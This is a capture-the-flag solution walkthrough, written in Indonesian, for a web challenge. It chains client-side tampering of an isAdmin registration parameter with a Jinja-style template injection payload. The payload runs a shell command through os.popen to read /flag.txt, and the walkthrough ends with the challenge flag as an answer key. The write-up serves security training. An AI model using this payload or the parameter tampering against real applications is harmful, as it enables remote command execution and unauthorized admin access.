** Solution Walkthrough **
Vulnerability : Privilege Escalation via Client-Side Parameter Tampering & SSTI 

1. Untuk mengeksploitasi kerentanan SSTI, user harus menjadi admin terlebih dahulu
2. Untuk menjadi admin, user hanya perlu memodifikasi parameter isAdmin menjadi true pada saat register
3. Setelah menjadi admin, user hanya perlu membuat payload SSTI pada notes untuk membaca flag

Payload :
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}

** Flag : LKSWNSB{4dm!n_T0_SSTI_S0_EZZZ} **